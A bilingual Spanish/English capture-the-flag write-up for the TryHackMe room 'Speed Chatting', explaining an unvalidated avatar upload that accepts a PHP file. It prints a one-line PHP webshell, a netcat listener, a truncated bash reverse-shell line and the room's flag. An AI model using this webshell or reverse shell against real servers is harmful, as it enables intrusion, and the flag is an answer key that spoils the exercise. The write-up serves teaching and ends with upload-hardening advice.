# Speed Chatting [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** CTF (Evento "Love at First Breach 2026" - Módulo LAFB CTF 2026)
* **Slug:** `lafb2026e4`
* **Link:** https://tryhackme.com/room/lafb2026e4
* **Sección / Section:** 01 Level Easy
* **Fuente / Source:** Web (API THM `api/v2/rooms/tasks?roomCode=lafb2026e4` + websearch de walkthroughs)

## Solucionario de Tareas / Task Solutions

> **ES:** Sala de evento (Love at First Breach 2026) de dificultad Fácil. El tema es una **subida de archivos sin validación** en un salón de chat de citas rápidas: se permite subir un "avatar" o archivo con extensión ejecutable, se emplaza en un directorio público y se interpreta por el servidor. Subiendo una webshell PHP se obtiene una reverse shell y se lee la flag.
> **EN:** Event room (Love at First Breach 2026) of Easy difficulty. The theme is an **unvalidated file upload** in a speed-dating chat room: you can upload an "avatar" or file with an executable extension, it is placed in a public directory and interpreted by the server. Uploading a PHP webshell gives a reverse shell and the flag is read.

### Task 1 - Chat Upload

> **ES:** El salón de *speed chatting* permite subir un archivo (avatar/foto) al perfil. La subida no valida ni la extensión ni el contenido MIME: se acepta `shell.php`. Tras la subida, el archivo queda accesible en el directorio público del sitio (`/uploads/`). Se invoca `GET /uploads/shell.php?cmd=id` (webshell) y, con un listener `nc -lvnp`, se manda la reverse shell clásica en PHP para obtener una shell interactiva; con `cat flag.txt` (o `find / -name '*flag*'`) se obtiene la flag. 1 pregunta.
> **EN:** The *speed chatting* room lets you upload a file (avatar/photo) to your profile. The upload validates neither the extension nor the MIME content: `shell.php` is accepted. After uploading, the file is reachable in the web's public directory (`/uploads/`). Call `GET /uploads/shell.php?cmd=id` (webshell) and, with a `nc -lvnp` listener, send the classic PHP reverse shell to get an interactive shell; `cat flag.txt` (or `find / -name '*flag*'`) yields the flag. 1 question.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the flag? | `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}` |

## Metodología / Methodology

1. **Paso / Step - Reconocimiento:** Web de chat rápido con un perfil subible (`avatar`/adjunto). `nmap` confirma `80/tcp` (y `22` opcional).
2. **Paso / Step - Probar la subida:** Se intenta subir un `.txt` (funciona) y luego `shell.php` (también se acepta). No hay validación de extensión ni de tipo real del archivo.
3. **Paso / Step - Webshell:** Se sube `shell.php` con `<?php echo shell_exec($_GET['cmd']); ?>` y se localiza en el directorio público (`/uploads/`). `GET /uploads/shell.php?cmd=id` confirma la ejecución como el usuario de la web.
4. **Paso / Step - Reverse shell:** En la máquina atacante `nc -lvnp 4444`; se dispara la reverse shell PHP (`python -c ...` o payload `bash -i >& /dev/tcp/...` via cmd) y se obtiene una shell.
5. **Paso / Step - Flag:** Se navega a `/var/www/...`/home raíz y `cat` de la flag: `THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}`.

### Cadena de ataque / Attack Chain

```
chat web (speed dating) -> subida de avatar sin validar
  -> shell.php aceptada -> /uploads/shell.php
  -> GET /uploads/shell.php?cmd=id   (webshell)
  -> nc -lvnp 4444 + reverse shell PHP -> shell interactiva
  -> cat flag.txt -> THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
```

**Lección:** Las subidas deben restringir extensiones, contenido MIME real y ejecución del directorio de destino; un "speed dating" no debería aceptar `.php` jamás.

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.